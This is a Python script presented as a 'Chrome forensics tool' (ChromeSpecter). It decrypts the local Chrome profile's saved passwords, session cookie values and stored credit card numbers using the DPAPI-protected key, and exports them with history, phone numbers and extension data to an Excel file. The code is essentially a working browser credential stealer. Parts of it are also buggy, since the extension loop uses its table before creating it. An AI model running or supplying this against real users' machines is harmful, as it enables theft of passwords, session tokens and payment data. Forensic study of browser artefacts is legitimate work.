################################################################################
#Chrome forensics tool
#Developed by Boris Ivanov
################################################################################
import os
from os import path
import base64
import win32crypt
from Crypto.Cipher import AES
import sqlite3
import json
import datetime
from datetime import date
import pandas as pd

os.system("cls||clear")#clear terminal

print(r"""

 ▄████▄   ██░ ██  ██▀███   ▒█████   ███▄ ▄███▓▓█████      ██████  ██▓███  ▓█████  ▄████▄  ▄▄▄█████▓▓█████  ██▀███
▒██▀ ▀█  ▓██░ ██▒▓██ ▒ ██▒▒██▒  ██▒▓██▒▀█▀ ██▒▓█   ▀    ▒██    ▒ ▓██░  ██▒▓█   ▀ ▒██▀ ▀█  ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
▒▓█    ▄ ▒██▀▀██░▓██ ░▄█ ▒▒██░  ██▒▓██    ▓██░▒███      ░ ▓██▄   ▓██░ ██▓▒▒███   ▒▓█    ▄ ▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
▒▓▓▄ ▄██▒░▓█ ░██ ▒██▀▀█▄  ▒██   ██░▒██    ▒██ ▒▓█  ▄      ▒   ██▒▒██▄█▓▒ ▒▒▓█  ▄ ▒▓▓▄ ▄██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄
▒ ▓███▀ ░░▓█▒░██▓░██▓ ▒██▒░ ████▓▒░▒██▒   ░██▒░▒████▒   ▒██████▒▒▒██▒ ░  ░░▒████▒▒ ▓███▀ ░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒
░ ░▒ ▒  ░ ▒ ░░▒░▒░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░   ░  ░░░ ▒░ ░   ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░░ ▒░ ░░ ░▒ ▒  ░  ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
  ░  ▒    ▒ ░▒░ ░  ░▒ ░ ▒░  ░ ▒ ▒░ ░  ░      ░ ░ ░  ░   ░ ░▒  ░ ░░▒ ░      ░ ░  ░  ░  ▒       ░     ░ ░  ░  ░▒ ░ ▒░
░         ░  ░░ ░  ░░   ░ ░ ░ ░ ▒  ░      ░      ░      ░  ░  ░  ░░          ░   ░          ░         ░     ░░   ░
░ ░       ░  ░  ░   ░         ░ ░         ░      ░  ░         ░              ░  ░░ ░                  ░  ░   ░
░                                                                                ░

""") #banner

#password cracking Functions
def humanTime(timestamp):
    epoch_start = datetime.datetime(1601,1,1)
    #create an object for the number of microseconds in the timestamp
    delta = datetime.timedelta(microseconds=int(timestamp))
    return epoch_start + delta

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
def decrypt_password(password, key):
    # get the initialization vector
    init_vector = password[3:15]
    password = password[15:]
    # generate cipher
    cipher = AES.new(key, AES.MODE_GCM, init_vector)
    # decrypt password
    return cipher.decrypt(password)[:-16].decode()
key = get_encryption_key()

#date and time
today = date.today()

#spawn folder for Excel
if path.exists("Data"):
    pass
else:
    os.mkdir("Data")

#menu system

def menuSystem():
    global root_dir
    menu1=True
    menu2=True
    while menu1:
        menu2=True
        print ("""
    [1] Detect folder
    [2] Specify folder location
    [3] Exit
        """)
        ans1 = input("[+] Make a selection! ")
        if ans1 == "1":
          root_dir = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                      "Google", "Chrome", "User Data", "default")
          os.system("cls||clear")
          print("\n[+] Chrome folder located at: " + root_dir)
          while menu2:
              print ("""
    [1] Run
    [2] Go back
    [3] Exit
              """)
              ans2 = input("[+] Make a selection! ")
              if ans2 == "1":
                root_dir = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                            "Google", "Chrome", "User Data", "default")
                menu1=False
                break
              if ans2 == "2":
                 os.system("cls||clear")
                 menu2=False
                 break
              if ans2 == "3":
                os.system("cls||clear")
                print("[-] Exiting ChromeSpecter!")
                exit()
              else:
                  os.system("cls||clear")
                  print("\n[-] Invalid selection!")
        elif ans1 == "2":
          os.system("cls||clear")
          print("[?]Hint! Usually(C:\\Users\\username\AppData\Local\Google\Chrome\\User Data\Default)")
          root_dir=input("\n[+] Please enter Chrom's default folder: ")
          break
        elif ans1 == "3":
            os.system("cls||clear")
            print("[-] Exiting ChromeSpecter!")
            exit()
        elif ans1 != "":
          os.system("cls||clear")
          print("\n[-] Invalid selection!")
menuSystem()
print(root_dir)
#DB Files
history = root_dir + "\History"
logins = root_dir + "\Login Data"
predictor = root_dir + "\\Network Action Predictor"
phoneNumber = root_dir + "\Web Data"
creditCards = root_dir + "\Web Data"
extensions = root_dir + "\Extensions"
json_dir = logins
cookies = root_dir + "\\Network\Cookies"
#SELECT statements
selectURL = "SELECT title, visit_count, typed_count, last_visit_time, url FROM urls"
selectLogin = "SELECT origin_url, username_value, password_value, date_last_used \
FROM logins"
selectPredictor = "SELECT user_text, url, number_of_hits, number_of_misses \
FROM network_action_predictor"
selectPhone = "SELECT number FROM autofill_profile_phones"
selectCard = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted \
,use_count, use_date, billing_address_id FROM credit_cards"
selectCookies = "SELECT creation_utc, expires_utc, last_access_utc \
, host_key, name, last_update_utc, is_secure, is_httponly, encrypted_value FROM cookies"


#extract browsing history
c_url = sqlite3.connect(history)
#read databse
df_url=pd.read_sql(selectURL, c_url)
#fix timestamps
df_url["last_visit"] = df_url["last_visit_time"].apply(humanTime)
del df_url["last_visit_time"]

#extract login data
c_login = sqlite3.connect(logins)
#read databse
df_login=pd.read_sql(selectLogin, c_login)
#fix timestamps
df_login["last_used"] = df_login["date_last_used"].apply(humanTime)
df_login["decoded_password"] = df_login["password_value"].apply(decrypt_password, key=key)
del df_login["date_last_used"]
del df_login["password_value"]

#exctract text predictions
c_predict = sqlite3.connect(predictor)
df_predict = pd.read_sql(selectPredictor, c_predict)

#extract phone numbers
c_phone = sqlite3.connect(phoneNumber)
df_phone = pd.read_sql(selectPhone, c_phone)

#extract credit card information
c_card = sqlite3.connect(creditCards)
df_card = pd.read_sql(selectCard, c_card)
df_card["decoded_card_number"] = df_card["card_number_encrypted"].apply(decrypt_password, key=key)
del df_card["card_number_encrypted"]

c_cookies = sqlite3.connect(cookies)
df_cookies = pd.read_sql(selectCookies, c_cookies)
df_cookies["creation_time"] = df_cookies["creation_utc"].apply(humanTime)
df_cookies["expiration"] = df_cookies["expires_utc"].apply(humanTime)
df_cookies["last accessed"] = df_cookies["last_access_utc"].apply(humanTime)
df_cookies["last_update"] = df_cookies["last_update_utc"].apply(humanTime)
df_cookies["value"] = df_cookies["encrypted_value"].apply(decrypt_password, key=key)
del df_cookies["creation_utc"]
del df_cookies["expires_utc"]
del df_cookies["last_access_utc"]
del df_cookies["last_update_utc"]
del df_cookies["encrypted_value"]

for filename in os.listdir(extensions):
    # Check if the file is a JSON file
    if filename.endswith('.json'):
        # Open the file and load the data
        with open(os.path.join(extensions, filename)) as f:
            data = json.load(f)
            # Extract the extension information
            ext_id = data['id']
            ext_name = data['name']
            ext_version = data['version']
            # Append the extension information to the DataFrame
            df_ext = df_ext.append({'ID': ext_id, 'Name': ext_name, 'Version': ext_version})

df_ext = pd.DataFrame(columns=['ID', 'Name', 'Version']) #df to append extension data
# Create the Excel file
now = datetime.datetime.now()
saveFile = ("data/" + f'{now.strftime("%d.%m.%Y_%H%M")}.xlsx')

with pd.ExcelWriter(saveFile) as writer:
    df_url.to_excel(writer, sheet_name="History", index=False)
    df_login.to_excel(writer, sheet_name="LoginData", index=False)
    df_predict.to_excel(writer, sheet_name="Action Predictor", index=False)
    df_phone.to_excel(writer, sheet_name="Phone numbers", index=False)
    df_card.to_excel(writer, sheet_name="Credit Cards", index=False)
    df_ext.to_excel(writer, sheet_name="Extensions", index=False)
    df_cookies.to_excel(writer, sheet_name="Cookies", index=False)

    for column in df_url:
        column_length = max(df_url[column].astype(str).map(len).max(), len(column))
        col_idx = df_url.columns.get_loc(column)
        writer.sheets['History'].set_column(col_idx, col_idx, column_length)
    for column in df_login:
        column_length = max(df_login[column].astype(str).map(len).max(), len(column))
        col_idx = df_login.columns.get_loc(column)
        writer.sheets['LoginData'].set_column(col_idx, col_idx, column_length)
    for column in df_predict:
        column_length = max(df_predict[column].astype(str).map(len).max(), len(column))
        col_idx = df_predict.columns.get_loc(column)
        writer.sheets['Action Predictor'].set_column(col_idx, col_idx, column_length)
    for column in df_phone:
        column_length = max(df_phone[column].astype(str).map(len).max(), len(column))
        col_idx = df_phone.columns.get_loc(column)
        writer.sheets['Phone numbers'].set_column(col_idx, col_idx, column_length)
    for column in df_card:
        column_length = max(df_card[column].astype(str).map(len).max(), len(column))
        col_idx = df_card.columns.get_loc(column)
        writer.sheets['Credit Cards'].set_column(col_idx, col_idx, column_length)
    for column in df_ext:
        column_length = max(df_ext[column].astype(str).map(len).max(), len(column))
        col_idx = df_ext.columns.get_loc(column)
        writer.sheets['Extensions'].set_column(col_idx, col_idx, column_length)
    for column in df_cookies:
        column_length = max(df_cookies[column].astype(str).map(len).max(), len(column))
        col_idx = df_cookies.columns.get_loc(column)
        writer.sheets['Cookies'].set_column(col_idx, col_idx, column_length)
print("\n[+]XLSX Report created succesfully")

# saveFile = ("data/" + today.strftime("%b-%d-%Y") + ".xlsx")
# with pd.ExcelWriter(saveFile) as writer:
#     df_url.to_excel(writer, sheet_name="History", index=False)
#     df_login.to_excel(writer, sheet_name="LoginData", index=False)
#     df_predict.to_excel(writer, sheet_name="Action Predictor", index=False)
#     df_phone.to_excel(writer, sheet_name="Phone numbers", index=False)
#     df_card.to_excel(writer, sheet_name="Credit cards", index=False)
# print("\n[+]XLSX Report created succesfully") "%b-%d-%Y"
